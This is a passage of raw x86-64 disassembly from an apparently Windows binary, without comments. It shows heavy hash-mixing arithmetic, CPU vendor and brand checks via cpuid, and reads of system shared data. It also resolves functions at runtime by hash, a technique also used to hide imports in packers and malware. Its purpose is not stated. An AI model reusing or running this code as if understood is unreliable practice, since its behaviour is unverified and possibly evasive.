   140045f3c:	shr    rcx,0x1d
   140045f40:	xor    rcx,rax
   140045f43:	movabs rbx,0xeb591050d1f713a9
   140045f4d:	imul   rcx,rbx
   140045f51:	mov    rax,rcx
   140045f54:	shr    rax,0x20
   140045f58:	xor    rax,rcx
   140045f5b:	mov    rsi,rax
   140045f5e:	rol    rsi,0x7
   140045f62:	mov    rcx,rax
   140045f65:	rol    rcx,0x29
   140045f69:	cmp    r11b,0x1
   140045f6d:	mov    rdx,rsi
   140045f70:	adc    rdx,0x0
   140045f74:	mov    r11,rcx
   140045f77:	sub    rcx,rsi
   140045f7a:	movabs rsi,0x678abdfef684ba71
   140045f84:	imul   rdx,rsi
   140045f88:	movabs r14,0x5e0b28fcb2d13cb9
   140045f92:	add    rdx,r14
   140045f95:	imul   r11,rsi
   140045f99:	movabs r14,0xbe7debfc1ed5d360
   140045fa3:	add    r11,r14
   140045fa6:	imul   rcx,rsi
   140045faa:	movabs rsi,0x6072c2ff6c0496a7
   140045fb4:	add    rcx,rsi
   140045fb7:	add    rdx,r9
   140045fba:	add    rdx,r10
   140045fbd:	sub    rcx,rax
   140045fc0:	sub    rcx,r11
   140045fc3:	mov    r9,rax
   140045fc6:	movabs r10,0x3e451175b9bfba90
   140045fd0:	xor    r9,r10
   140045fd3:	imul   r9,rdi
   140045fd7:	mov    r10,r9
   140045fda:	shr    r10,0x1d
   140045fde:	xor    r10,r9
   140045fe1:	imul   r10,rbx
   140045fe5:	mov    rsi,r10
   140045fe8:	shr    rsi,0x20
   140045fec:	xor    rsi,r10
   140045fef:	mov    r9,rsi
   140045ff2:	rol    r9,0x7
   140045ff6:	add    rcx,rdx
   140045ff9:	mov    rdi,rsi
   140045ffc:	rol    rdi,0x29
   140046000:	cmp    r8,0x200
   140046007:	mov    rdx,r9
   14004600a:	sbb    rdx,0xffffffffffffffff
   14004600e:	mov    r8,rdi
   140046011:	sub    rdi,r9
   140046014:	movabs r9,0x4a8df669e8d834af
   14004601e:	imul   rdx,r9
   140046022:	movabs r10,0xd2a7391cd575c870
   14004602c:	add    rdx,r10
   14004602f:	add    rdx,rax
   140046032:	add    rdx,rcx
   140046035:	imul   r8,r9
   140046039:	movabs rax,0xf4156b733eedcd2
   140046043:	add    r8,rax
   140046046:	imul   rdi,r9
   14004604a:	movabs rax,0xf20c273075a0dfb3
   140046054:	add    rdi,rax
   140046057:	sub    rdi,rsi
   14004605a:	sub    rdi,r8
   14004605d:	add    rdi,rdx
   140046060:	mov    rbx,QWORD PTR [rip+0x51fa1]        # 0x140098008
   140046067:	call   0x1400641a4
   14004606c:	mov    r8,rbx
   14004606f:	cmp    rax,0x1
   140046073:	jne    0x1400460b2
   140046075:	movabs rax,0x828be76a59740b3e
   14004607f:	xor    rdx,rax
   140046082:	movabs rax,0x406aa9c82dbf9701
   14004608c:	imul   rdx,rax
   140046090:	mov    rax,rdx
   140046093:	shr    rax,0x1d
   140046097:	xor    rax,rdx
   14004609a:	movabs rcx,0xeb591050d1f713a9
   1400460a4:	imul   rax,rcx
   1400460a8:	mov    r8,rax
   1400460ab:	shr    r8,0x20
   1400460af:	xor    r8,rax
   1400460b2:	mov    rax,rsi
   1400460b5:	movabs rcx,0x1112c8f0854959b2
   1400460bf:	xor    rax,rcx
   1400460c2:	movabs r9,0x406aa9c82dbf9701
   1400460cc:	imul   rax,r9
   1400460d0:	mov    rcx,rax
   1400460d3:	shr    rcx,0x1d
   1400460d7:	xor    rcx,rax
   1400460da:	movabs r10,0xeb591050d1f713a9
   1400460e4:	imul   rcx,r10
   1400460e8:	mov    rax,rcx
   1400460eb:	shr    rax,0x20
   1400460ef:	xor    rax,rcx
   1400460f2:	mov    rdx,rax
   1400460f5:	rol    rdx,0x7
   1400460f9:	mov    rcx,rax
   1400460fc:	rol    rcx,0x29
   140046100:	add    rbx,rdx
   140046103:	add    r8,rcx
   140046106:	sub    rcx,rdx
   140046109:	movabs rdx,0xdd2cc34f540e7fd
   140046113:	imul   rbx,rdx
   140046117:	movabs r11,0x62f6334eafed42ea
   140046121:	add    rbx,r11
   140046124:	imul   r8,rdx
   140046128:	movabs r11,0xa76e727ea004cc28
   140046132:	add    r8,r11
   140046135:	imul   rcx,rdx
   140046139:	movabs rdx,0x44783f2ff017893e
   140046143:	add    rcx,rdx
   140046146:	add    rbx,rsi
   140046149:	add    rbx,rdi
   14004614c:	sub    rcx,rax
   14004614f:	sub    rcx,r8
   140046152:	add    rcx,rbx
   140046155:	mov    edx,DWORD PTR [rbp+0xcb0]
   14004615b:	mov    r8,rax
   14004615e:	movabs r11,0x5d1f41e2fb54cee7
   140046168:	xor    r8,r11
   14004616b:	imul   r8,r9
   14004616f:	mov    r9,r8
   140046172:	shr    r9,0x1d
   140046176:	xor    r9,r8
   140046179:	imul   r9,r10
   14004617d:	mov    r13,r9
   140046180:	shr    r13,0x20
   140046184:	xor    r13,r9
   140046187:	mov    r9,r13
   14004618a:	rol    r9,0x7
   14004618e:	mov    r12,r13
   140046191:	rol    r12,0x29
   140046195:	add    rdx,r9
   140046198:	mov    r8,r12
   14004619b:	sub    r12,r9
   14004619e:	movabs r9,0xeeb07943ee33699f
   1400461a8:	imul   rdx,r9
   1400461ac:	movabs r10,0xac1e44c4dc8e4079
   1400461b6:	add    rdx,r10
   1400461b9:	add    rdx,rax
   1400461bc:	add    rdx,rcx
   1400461bf:	imul   r8,r9
   1400461c3:	movabs rax,0x56cf16fd4106c9e6
   1400461cd:	add    r8,rax
   1400461d0:	imul   r12,r9
   1400461d4:	movabs rax,0xaab0d2386478896d
   1400461de:	add    r12,rax
   1400461e1:	sub    r12,r13
   1400461e4:	sub    r12,r8
   1400461e7:	add    r12,rdx
   1400461ea:	mov    al,BYTE PTR [rip+0x529c8]        # 0x140098bb8
   1400461f0:	cmp    al,0x1
   1400461f2:	je     0x140046213
   1400461f4:	movzx  eax,al
   1400461f7:	test   eax,eax
   1400461f9:	jne    0x14004626b
   1400461fb:	call   0x140065d51
   140046200:	test   rax,rax
   140046203:	sete   cl
   140046206:	inc    cl
   140046208:	mov    BYTE PTR [rip+0x529aa],cl        # 0x140098bb8
   14004620e:	test   rax,rax
   140046211:	je     0x14004626b
   140046213:	mov    ecx,0x1000
   140046218:	push   0x4
   14004621a:	pop    rdx
   14004621b:	call   0x1400647f5
   140046220:	test   rax,rax
   140046223:	je     0x14004628f
   140046225:	mov    rbx,rax
   140046228:	and    DWORD PTR [rbp+0xd10],0x0
   14004622f:	lea    rcx,[rip+0x528a2]        # 0x140098ad8
   140046236:	mov    edx,0xba7c2f
   14004623b:	mov    r8d,0x6f217213
   140046241:	call   0x140064358
   140046246:	test   rax,rax
   140046249:	je     0x1400462b3
   14004624b:	mov    edx,0x1000
   140046250:	mov    rcx,rbx
   140046253:	push   0x2
   140046255:	pop    r8
   140046257:	lea    r9,[rbp+0xd10]
   14004625e:	call   rax
   140046260:	xor    r15d,r15d
   140046263:	test   eax,eax
   140046265:	setne  r15b
   140046269:	jmp    0x1400462b6
   14004626b:	xor    eax,eax
   14004626d:	cmp    rax,0x40
   140046271:	je     0x140046358
   140046277:	or     QWORD PTR [rbp+rax*1+0x7d0],0xffffffffffffffff
   140046280:	and    QWORD PTR [rbp+rax*1+0x7d8],0x0
   140046289:	add    rax,0x10
   14004628d:	jmp    0x14004626d
   14004628f:	xor    eax,eax
   140046291:	cmp    rax,0x40
   140046295:	je     0x140046358
   14004629b:	or     QWORD PTR [rbp+rax*1+0x7d0],0xffffffffffffffff
   1400462a4:	and    QWORD PTR [rbp+rax*1+0x7d8],0x0
   1400462ad:	add    rax,0x10
   1400462b1:	jmp    0x140046291
   1400462b3:	xor    r15d,r15d
   1400462b6:	mov    r14,rbx
   1400462b9:	add    r14,0xe4e
   1400462c0:	call   0x140064227
   1400462c5:	mov    eax,0xc883a7e
   1400462ca:	xchg   DWORD PTR [rip+0x52810],eax        # 0x140098ae0
   1400462d0:	mov    r9,r14
   1400462d3:	lea    rsi,[rip+0xa]        # 0x1400462e4
   1400462da:	lea    rdi,[rip+0x7]        # 0x1400462e8
   1400462e1:	mov    r11,r9
   1400462e4:	mov    BYTE PTR [r9],0xed
   1400462e8:	mov    r8,r11
   1400462eb:	mov    rsi,r8
   1400462ee:	xor    eax,eax
   1400462f0:	xchg   DWORD PTR [rip+0x527ea],eax        # 0x140098ae0
   1400462f6:	mov    BYTE PTR [rip+0x52791],0x0        # 0x140098a8e
   1400462fd:	movzx  edi,BYTE PTR [rbx+0xe4e]
   140046304:	mov    rcx,rbx
   140046307:	call   0x1400647b6
   14004630c:	mov    eax,DWORD PTR [rbp+0xd10]
   140046312:	btc    r14,0x30
   140046317:	mov    QWORD PTR [rbp+0x7d0],r15
   14004631e:	mov    QWORD PTR [rbp+0x7d8],0x1
   140046329:	mov    QWORD PTR [rbp+0x7e0],rax
   140046330:	mov    QWORD PTR [rbp+0x7e8],0x4
   14004633b:	mov    QWORD PTR [rbp+0x7f0],rsi
   140046342:	mov    QWORD PTR [rbp+0x7f8],r14
   140046349:	mov    QWORD PTR [rbp+0x800],rdi
   140046350:	and    QWORD PTR [rbp+0x808],0x0
   140046358:	xor    eax,eax
   14004635a:	movabs rcx,0x73706dc82e51a60
   140046364:	movabs rbx,0x406aa9c82dbf9701
   14004636e:	cmp    rax,0x40
   140046372:	je     0x14004645c
   140046378:	mov    rdx,r13
   14004637b:	xor    rdx,rcx
   14004637e:	imul   rdx,rbx
   140046382:	mov    r8,rdx
   140046385:	shr    r8,0x1d
   140046389:	xor    r8,rdx
   14004638c:	movabs rdi,0xeb591050d1f713a9
   140046396:	imul   r8,rdi
   14004639a:	mov    rdx,r8
   14004639d:	shr    rdx,0x20
   1400463a1:	xor    rdx,r8
   1400463a4:	mov    r8,rcx
   1400463a7:	movabs r9,0x629eef0eeda7e1b9
   1400463b1:	xor    r8,r9
   1400463b4:	imul   r8,rbx
   1400463b8:	mov    r10,r8
   1400463bb:	shr    r10,0x1d
   1400463bf:	xor    r10,r8
   1400463c2:	imul   r10,rdi
   1400463c6:	mov    r9,r10
   1400463c9:	shr    r9,0x20
   1400463cd:	xor    r9,r10
   1400463d0:	mov    r10,rdx
   1400463d3:	rol    r10,0x7
   1400463d7:	or     r9,0x1
   1400463db:	mov    r11,rdx
   1400463de:	rol    r11,0x29
   1400463e2:	add    r10,rcx
   1400463e5:	mov    r8,QWORD PTR [rbp+rax*1+0x7d0]
   1400463ed:	add    r8,r10
   1400463f0:	imul   r8,r9
   1400463f4:	add    r8,r13
   1400463f7:	add    r8,r12
   1400463fa:	mov    r12,rcx
   1400463fd:	rol    r12,0x20
   140046401:	movabs r14,0x6161c4ba7c2419b8
   14004640b:	xor    r12,r14
   14004640e:	lea    rsi,[r11+r12*1]
   140046412:	sub    r12,r10
   140046415:	add    rsi,QWORD PTR [rbp+rax*1+0x7d8]
   14004641d:	add    r12,r11
   140046420:	imul   rsi,r9
   140046424:	imul   r12,r9
   140046428:	sub    r12,rdx
   14004642b:	sub    r12,rsi
   14004642e:	add    r12,r8
   140046431:	xor    rcx,r14
   140046434:	imul   rcx,rbx
   140046438:	mov    r8,rcx
   14004643b:	shr    r8,0x1d
   14004643f:	xor    r8,rcx
   140046442:	imul   r8,rdi
   140046446:	mov    rcx,r8
   140046449:	shr    rcx,0x20
   14004644d:	xor    rcx,r8
   140046450:	add    rax,0x10
   140046454:	mov    r13,rdx
   140046457:	jmp    0x14004636e
   14004645c:	xor    ecx,ecx
   14004645e:	push   0x4
   140046460:	pop    rdx
   140046461:	call   0x1400647f5
   140046466:	mov    rsi,rax
   140046469:	mov    edi,DWORD PTR gs:0x68
   140046471:	xor    ecx,ecx
   140046473:	call   0x1400647b6
   140046478:	mov    ecx,DWORD PTR gs:0x68
   140046480:	mov    eax,eax
   140046482:	mov    QWORD PTR [rbp+0x7d0],rsi
   140046489:	and    QWORD PTR [rbp+0x7d8],0x0
   140046491:	mov    QWORD PTR [rbp+0x7e0],rax
   140046498:	and    QWORD PTR [rbp+0x7e8],0x0
   1400464a0:	mov    eax,edi
   1400464a2:	mov    ecx,ecx
   1400464a4:	mov    QWORD PTR [rbp+0x7f0],rax
   1400464ab:	mov    QWORD PTR [rbp+0x7f8],0x57
   1400464b6:	mov    QWORD PTR [rbp+0x800],rcx
   1400464bd:	mov    QWORD PTR [rbp+0x808],0x1e7
   1400464c8:	xor    eax,eax
   1400464ca:	movabs rcx,0x95978c0b9ca55222
   1400464d4:	cmp    rax,0x40
   1400464d8:	je     0x1400465c2
   1400464de:	mov    rdx,r13
   1400464e1:	xor    rdx,rcx
   1400464e4:	imul   rdx,rbx
   1400464e8:	mov    r8,rdx
   1400464eb:	shr    r8,0x1d
   1400464ef:	xor    r8,rdx
   1400464f2:	movabs rdi,0xeb591050d1f713a9
   1400464fc:	imul   r8,rdi
   140046500:	mov    rdx,r8
   140046503:	shr    rdx,0x20
   140046507:	xor    rdx,r8
   14004650a:	mov    r8,rcx
   14004650d:	movabs r9,0x629eef0eeda7e1b9
   140046517:	xor    r8,r9
   14004651a:	imul   r8,rbx
   14004651e:	mov    r10,r8
   140046521:	shr    r10,0x1d
   140046525:	xor    r10,r8
   140046528:	imul   r10,rdi
   14004652c:	mov    r9,r10
   14004652f:	shr    r9,0x20
   140046533:	xor    r9,r10
   140046536:	mov    r10,rdx
   140046539:	rol    r10,0x7
   14004653d:	or     r9,0x1
   140046541:	mov    r11,rdx
   140046544:	rol    r11,0x29
   140046548:	add    r10,rcx
   14004654b:	mov    r8,QWORD PTR [rbp+rax*1+0x7d0]
   140046553:	add    r8,r10
   140046556:	imul   r8,r9
   14004655a:	add    r8,r13
   14004655d:	add    r8,r12
   140046560:	mov    r12,rcx
   140046563:	rol    r12,0x20
   140046567:	movabs r14,0x6161c4ba7c2419b8
   140046571:	xor    r12,r14
   140046574:	lea    rsi,[r11+r12*1]
   140046578:	sub    r12,r10
   14004657b:	add    rsi,QWORD PTR [rbp+rax*1+0x7d8]
   140046583:	add    r12,r11
   140046586:	imul   rsi,r9
   14004658a:	imul   r12,r9
   14004658e:	sub    r12,rdx
   140046591:	sub    r12,rsi
   140046594:	add    r12,r8
   140046597:	xor    rcx,r14
   14004659a:	imul   rcx,rbx
   14004659e:	mov    r8,rcx
   1400465a1:	shr    r8,0x1d
   1400465a5:	xor    r8,rcx
   1400465a8:	imul   r8,rdi
   1400465ac:	mov    rcx,r8
   1400465af:	shr    rcx,0x20
   1400465b3:	xor    rcx,r8
   1400465b6:	add    rax,0x10
   1400465ba:	mov    r13,rdx
   1400465bd:	jmp    0x1400464d4
   1400465c2:	mov    rax,QWORD PTR [rbp+0x6b0]
   1400465c9:	mov    rsi,QWORD PTR [rax+0x30]
   1400465cd:	test   rsi,rsi
   1400465d0:	je     0x1400466f9
   1400465d6:	xor    eax,eax
   1400465d8:	cmp    rax,0x5
   1400465dc:	je     0x1400465ec
   1400465de:	and    QWORD PTR [rbp+rax*8+0xd10],0x0
   1400465e7:	inc    rax
   1400465ea:	jmp    0x1400465d8
   1400465ec:	xor    ebx,ebx
   1400465ee:	lea    r14,[rip+0x524bb]        # 0x140098ab0
   1400465f5:	cmp    rbx,0x28
   1400465f9:	je     0x14004663a
   1400465fb:	lea    rax,[rip+0x41b96]        # 0x140088198
   140046602:	mov    rdi,QWORD PTR [rbx+rax*1]
   140046606:	mov    rcx,r14
   140046609:	mov    edx,0xba7c2f
   14004660e:	mov    r8d,0xa86f2af6
   140046614:	call   0x140064358
   140046619:	test   rax,rax
   14004661c:	je     0x14004662a
   14004661e:	mov    rcx,rsi
   140046621:	xor    edx,edx
   140046623:	mov    r8,rdi
   140046626:	call   rax
   140046628:	jmp    0x14004662c
   14004662a:	xor    eax,eax
   14004662c:	mov    QWORD PTR [rbp+rbx*1+0xd10],rax
   140046634:	add    rbx,0x8
   140046638:	jmp    0x1400465f5
   14004663a:	xor    eax,eax
   14004663c:	cmp    rax,0xa0
   140046642:	je     0x140046652
   140046644:	movups XMMWORD PTR [rbp+rax*1+0x7d0],xmm6
   14004664c:	add    rax,0x10
   140046650:	jmp    0x14004663c
   140046652:	xor    r14d,r14d
   140046655:	lea    r15,[rip+0x5245c]        # 0x140098ab8
   14004665c:	cmp    r14,0x28
   140046660:	je     0x14004671c
   140046666:	mov    rdi,QWORD PTR [rbp+r14*1+0xd10]
   14004666e:	push   0xffffffffffffffff
   140046670:	pop    rbx
   140046671:	test   rdi,rdi
   140046674:	je     0x1400466c1
   140046676:	lea    rcx,[rip+0x52443]        # 0x140098ac0
   14004667d:	mov    edx,0xba7c2f
   140046682:	mov    r8d,0x4f965d7d
   140046688:	call   0x140064358
   14004668d:	test   rax,rax
   140046690:	je     0x14004669f
   140046692:	mov    rcx,rsi
   140046695:	xor    edx,edx
   140046697:	mov    r8,rdi
   14004669a:	call   rax
   14004669c:	mov    rbx,rax
   14004669f:	mov    rcx,r15
   1400466a2:	mov    edx,0xba7c2f
   1400466a7:	mov    r8d,0xb05949f4
   1400466ad:	call   0x140064358
   1400466b2:	test   rax,rax
   1400466b5:	je     0x1400466c1
   1400466b7:	mov    rcx,rsi
   1400466ba:	xor    edx,edx
   1400466bc:	mov    r8,rdi
   1400466bf:	call   rax
   1400466c1:	lea    rax,[rip+0x41ad0]        # 0x140088198
   1400466c8:	mov    rax,QWORD PTR [r14+rax*1]
   1400466cc:	mov    QWORD PTR [rbp+r14*4+0x7d0],rbx
   1400466d4:	mov    QWORD PTR [rbp+r14*4+0x7d8],rax
   1400466dc:	mov    QWORD PTR [rbp+r14*4+0x7e0],rdi
   1400466e4:	and    rdi,0xfffffffffffffff0
   1400466e8:	mov    QWORD PTR [rbp+r14*4+0x7e8],rdi
   1400466f0:	add    r14,0x8
   1400466f4:	jmp    0x14004665c
   1400466f9:	push   0x8
   1400466fb:	pop    rax
   1400466fc:	cmp    rax,0xa8
   140046702:	je     0x14004671c
   140046704:	or     QWORD PTR [rbp+rax*1+0x7c8],0xffffffffffffffff
   14004670d:	and    QWORD PTR [rbp+rax*1+0x7d0],0x0
   140046716:	add    rax,0x10
   14004671a:	jmp    0x1400466fc
   14004671c:	push   0x8
   14004671e:	pop    rax
   14004671f:	movabs rcx,0xf5f8efaeb9dc339f
   140046729:	movabs rdi,0x406aa9c82dbf9701
   140046733:	cmp    rax,0xa8
   140046739:	je     0x140046823
   14004673f:	mov    rdx,r13
   140046742:	xor    rdx,rcx
   140046745:	imul   rdx,rdi
   140046749:	mov    r8,rdx
   14004674c:	shr    r8,0x1d
   140046750:	xor    r8,rdx
   140046753:	movabs rbx,0xeb591050d1f713a9
   14004675d:	imul   r8,rbx
   140046761:	mov    rdx,r8
   140046764:	shr    rdx,0x20
   140046768:	xor    rdx,r8
   14004676b:	mov    r8,rcx
   14004676e:	movabs r9,0x629eef0eeda7e1b9
   140046778:	xor    r8,r9
   14004677b:	imul   r8,rdi
   14004677f:	mov    r10,r8
   140046782:	shr    r10,0x1d
   140046786:	xor    r10,r8
   140046789:	imul   r10,rbx
   14004678d:	mov    r9,r10
   140046790:	shr    r9,0x20
   140046794:	xor    r9,r10
   140046797:	mov    r10,rdx
   14004679a:	rol    r10,0x7
   14004679e:	or     r9,0x1
   1400467a2:	mov    r11,rdx
   1400467a5:	rol    r11,0x29
   1400467a9:	add    r10,rcx
   1400467ac:	mov    r8,QWORD PTR [rbp+rax*1+0x7c8]
   1400467b4:	add    r8,r10
   1400467b7:	imul   r8,r9
   1400467bb:	add    r8,r13
   1400467be:	add    r8,r12
   1400467c1:	mov    r12,rcx
   1400467c4:	rol    r12,0x20
   1400467c8:	movabs r14,0x6161c4ba7c2419b8
   1400467d2:	xor    r12,r14
   1400467d5:	lea    rsi,[r11+r12*1]
   1400467d9:	sub    r12,r10
   1400467dc:	add    rsi,QWORD PTR [rbp+rax*1+0x7d0]
   1400467e4:	add    r12,r11
   1400467e7:	imul   rsi,r9
   1400467eb:	imul   r12,r9
   1400467ef:	sub    r12,rdx
   1400467f2:	sub    r12,rsi
   1400467f5:	add    r12,r8
   1400467f8:	xor    rcx,r14
   1400467fb:	imul   rcx,rdi
   1400467ff:	mov    r8,rcx
   140046802:	shr    r8,0x1d
   140046806:	xor    r8,rcx
   140046809:	imul   r8,rbx
   14004680d:	mov    rcx,r8
   140046810:	shr    rcx,0x20
   140046814:	xor    rcx,r8
   140046817:	add    rax,0x10
   14004681b:	mov    r13,rdx
   14004681e:	jmp    0x140046733
   140046823:	mov    eax,0x80000000
   140046828:	xor    ecx,ecx
   14004682a:	mov    r8,rbx
   14004682d:	cpuid
   14004682f:	xchg   rbx,r8
   140046832:	mov    r8d,eax
   140046835:	mov    eax,0x80000008
   14004683a:	cmp    r8d,eax
   14004683d:	cmovae r8d,eax
   140046841:	mov    eax,0x80000001
   140046846:	xor    ecx,ecx
   140046848:	mov    r9,rbx
   14004684b:	cpuid
   14004684d:	xchg   rbx,r9
   140046850:	mov    r9d,edx
   140046853:	xor    ecx,ecx
   140046855:	xor    eax,eax
   140046857:	mov    r10,rbx
   14004685a:	cpuid
   14004685c:	xchg   rbx,r10
   14004685f:	cmp    r10d,0x68747541
   140046866:	je     0x14004687e
   140046868:	mov    r11b,0x1
   14004686b:	push   0x3
   14004686d:	pop    rsi
   14004686e:	cmp    r10d,0x756e6547
   140046875:	jne    0x140046884
   140046877:	xor    r11d,r11d
   14004687a:	push   0x1
   14004687c:	jmp    0x140046883
   14004687e:	xor    r11d,r11d
   140046881:	push   0x2
   140046883:	pop    rsi
   140046884:	and    r9d,0x20000800
   14004688b:	movaps XMMWORD PTR [rbp+0xd30],xmm6
   140046892:	movaps XMMWORD PTR [rbp+0xd20],xmm6
   140046899:	movaps XMMWORD PTR [rbp+0xd10],xmm6
   1400468a0:	mov    r10d,0x80000002
   1400468a6:	xor    r14d,r14d
   1400468a9:	push   0xc
   1400468ab:	pop    rdi
   1400468ac:	test   r14b,0x1
   1400468b0:	jne    0x14004690a
   1400468b2:	cmp    r10d,0x80000004
   1400468b9:	ja     0x14004690a
   1400468bb:	xor    ecx,ecx
   1400468bd:	mov    eax,r10d
   1400468c0:	mov    rbx,rbx
   1400468c3:	cpuid
   1400468c5:	xchg   rbx,rbx
   1400468c8:	cmp    rdi,0x3c
   1400468cc:	je     0x140048140
   1400468d2:	lea    r15d,[r10+0x1]
   1400468d6:	cmp    r10d,0x80000004
   1400468dd:	sete   r14b
   1400468e1:	cmove  r15d,r10d
   1400468e5:	mov    DWORD PTR [rbp+rdi*1+0xd04],eax
   1400468ec:	mov    DWORD PTR [rbp+rdi*1+0xd08],ebx
   1400468f3:	mov    DWORD PTR [rbp+rdi*1+0xd0c],ecx
   1400468fa:	mov    DWORD PTR [rbp+rdi*1+0xd10],edx
   140046901:	add    rdi,0x10
   140046905:	mov    r10d,r15d
   140046908:	jmp    0x1400468ac
   14004690a:	movaps xmm0,XMMWORD PTR [rbp+0xd10]
   140046911:	movaps xmm1,XMMWORD PTR [rbp+0xd20]
   140046918:	movaps xmm2,XMMWORD PTR [rbp+0xd30]
   14004691f:	movaps XMMWORD PTR [rbp+0x7f0],xmm2
   140046926:	movaps XMMWORD PTR [rbp+0x7e0],xmm1
   14004692d:	movaps XMMWORD PTR [rbp+0x7d0],xmm0
   140046934:	push   0x4
   140046936:	pop    rcx
   140046937:	push   0x3
   140046939:	pop    rax
   14004693a:	push   0x2
   14004693c:	pop    rbx
   14004693d:	cmp    rcx,0x30
   140046941:	je     0x140046992
   140046943:	movzx  r10d,WORD PTR [rbp+rcx*1+0x7cc]
   14004694c:	movzx  edx,BYTE PTR [rbp+rcx*1+0x7ce]
   140046954:	movzx  edi,BYTE PTR [rbp+rcx*1+0x7cf]
   14004695c:	shl    edi,0x18
   14004695f:	shl    edx,0x10
   140046962:	or     edx,r10d
   140046965:	or     edi,edx
   140046967:	cmp    edi,0x65746e49
   14004696d:	jne    0x14004697d
   14004696f:	cmp    BYTE PTR [rbp+rcx*1+0x7d0],0x6c
   140046977:	push   0x1
   140046979:	pop    r10
   14004697b:	je     0x14004698a
   14004697d:	cmp    edx,0x444d41
   140046983:	cmove  rax,rbx
   140046987:	mov    r10,rax
   14004698a:	inc    rcx
   14004698d:	mov    rax,r10
   140046990:	jmp    0x14004693d
   140046992:	mov    ecx,r8d
   140046995:	mov    edx,r9d
   140046998:	test   r11b,r11b
   14004699b:	push   0x3
   14004699d:	pop    r8
   14004699f:	cmovne rax,r8
   1400469a3:	mov    QWORD PTR [rbp+0xf80],rcx
   1400469aa:	mov    ecx,0x80000008
   1400469af:	mov    QWORD PTR [rbp+0xf88],rcx
   1400469b6:	mov    QWORD PTR [rbp+0xf90],rdx
   1400469bd:	mov    QWORD PTR [rbp+0xf98],0x20000800
   1400469c8:	mov    QWORD PTR [rbp+0xfa0],rsi
   1400469cf:	mov    QWORD PTR [rbp+0xfa8],rax
   1400469d6:	push   0x8
   1400469d8:	pop    rax
   1400469d9:	movabs rcx,0x83cf5d5d177bb10c
   1400469e3:	movabs rdi,0x406aa9c82dbf9701
   1400469ed:	cmp    rax,0x38
   1400469f1:	je     0x140046adb
   1400469f7:	mov    rdx,r13
   1400469fa:	xor    rdx,rcx
   1400469fd:	imul   rdx,rdi
   140046a01:	mov    r8,rdx
   140046a04:	shr    r8,0x1d
   140046a08:	xor    r8,rdx
   140046a0b:	movabs rbx,0xeb591050d1f713a9
   140046a15:	imul   r8,rbx
   140046a19:	mov    rdx,r8
   140046a1c:	shr    rdx,0x20
   140046a20:	xor    rdx,r8
   140046a23:	mov    r8,rcx
   140046a26:	movabs r9,0x629eef0eeda7e1b9
   140046a30:	xor    r8,r9
   140046a33:	imul   r8,rdi
   140046a37:	mov    r10,r8
   140046a3a:	shr    r10,0x1d
   140046a3e:	xor    r10,r8
   140046a41:	imul   r10,rbx
   140046a45:	mov    r9,r10
   140046a48:	shr    r9,0x20
   140046a4c:	xor    r9,r10
   140046a4f:	mov    r10,rdx
   140046a52:	rol    r10,0x7
   140046a56:	or     r9,0x1
   140046a5a:	mov    r11,rdx
   140046a5d:	rol    r11,0x29
   140046a61:	add    r10,rcx
   140046a64:	mov    r8,QWORD PTR [rbp+rax*1+0xf78]
   140046a6c:	add    r8,r10
   140046a6f:	imul   r8,r9
   140046a73:	add    r8,r13
   140046a76:	add    r8,r12
   140046a79:	mov    r12,rcx
   140046a7c:	rol    r12,0x20
   140046a80:	movabs r14,0x6161c4ba7c2419b8
   140046a8a:	xor    r12,r14
   140046a8d:	lea    rsi,[r11+r12*1]
   140046a91:	sub    r12,r10
   140046a94:	add    rsi,QWORD PTR [rbp+rax*1+0xf80]
   140046a9c:	add    r12,r11
   140046a9f:	imul   rsi,r9
   140046aa3:	imul   r12,r9
   140046aa7:	sub    r12,rdx
   140046aaa:	sub    r12,rsi
   140046aad:	add    r12,r8
   140046ab0:	xor    rcx,r14
   140046ab3:	imul   rcx,rdi
   140046ab7:	mov    r8,rcx
   140046aba:	shr    r8,0x1d
   140046abe:	xor    r8,rcx
   140046ac1:	imul   r8,rbx
   140046ac5:	mov    rcx,r8
   140046ac8:	shr    rcx,0x20
   140046acc:	xor    rcx,r8
   140046acf:	add    rax,0x10
   140046ad3:	mov    r13,rdx
   140046ad6:	jmp    0x1400469ed
   140046adb:	push   0x1
   140046add:	pop    rax
   140046ade:	xor    ecx,ecx
   140046ae0:	mov    r8,rbx
   140046ae3:	cpuid
   140046ae5:	xchg   rbx,r8
   140046ae8:	mov    DWORD PTR [rbp+0x1180],ecx
   140046aee:	xor    ecx,ecx
   140046af0:	mov    eax,0x80000001
   140046af5:	mov    r8,rbx
   140046af8:	cpuid
   140046afa:	xchg   rbx,r8
   140046afd:	mov    QWORD PTR [rbp+0x1178],rdx
   140046b04:	movabs rax,0xc0000000d
   140046b0e:	mov    QWORD PTR [rbp+0xd10],rax
   140046b15:	mov    DWORD PTR [rbp+0xd18],0x11
   140046b1f:	xor    esi,esi
   140046b21:	xor    ebx,ebx
   140046b23:	xor    r14d,r14d
   140046b26:	cmp    rsi,0x3
   140046b2a:	je     0x140046b81
   140046b2c:	mov    edi,DWORD PTR [rbp+rsi*4+0xd10]
   140046b33:	xor    r15d,r15d
   140046b36:	cmp    BYTE PTR [rdi+0x7ffe0274],0x0
   140046b3d:	setne  r15b
   140046b41:	mov    ecx,esi
   140046b43:	shl    r15,cl
   140046b46:	lea    rcx,[rip+0x52033]        # 0x140098b80
   140046b4d:	mov    edx,0xba7c2f
   140046b52:	mov    r8d,0xb896b5e1
   140046b58:	call   0x140064358
   140046b5d:	test   rax,rax
   140046b60:	je     0x140046b6f
   140046b62:	mov    ecx,edi
   140046b64:	call   rax
   140046b66:	xor    edx,edx
   140046b68:	test   eax,eax
   140046b6a:	setne  dl
   140046b6d:	jmp    0x140046b71
   140046b6f:	xor    edx,edx
   140046b71:	mov    ecx,esi
   140046b73:	shl    rdx,cl
   140046b76:	or     r14,r15
   140046b79:	or     rbx,rdx
   140046b7c:	inc    rsi
   140046b7f:	jmp    0x140046b26
   140046b81:	mov    eax,DWORD PTR [rbp+0x1180]
   140046b87:	mov    r15d,eax
   140046b8a:	shr    r15d,0x1b
   140046b8e:	mov    rsi,QWORD PTR ds:0x7ffe03d8
   140046b96:	mov    QWORD PTR [rbp+0x1170],rsi
   140046b9d:	and    r15d,0x1
   140046ba1:	je     0x140046c0f
   140046ba3:	mov    al,BYTE PTR [rip+0x5200f]        # 0x140098bb8
   140046ba9:	cmp    al,0x1
   140046bab:	je     0x140046bcf
   140046bad:	movzx  eax,al
   140046bb0:	push   0xffffffffffffffff
   140046bb2:	pop    rsi
   140046bb3:	test   eax,eax
   140046bb5:	jne    0x140046c0f
   140046bb7:	call   0x140065d51
   140046bbc:	test   rax,rax
   140046bbf:	sete   cl
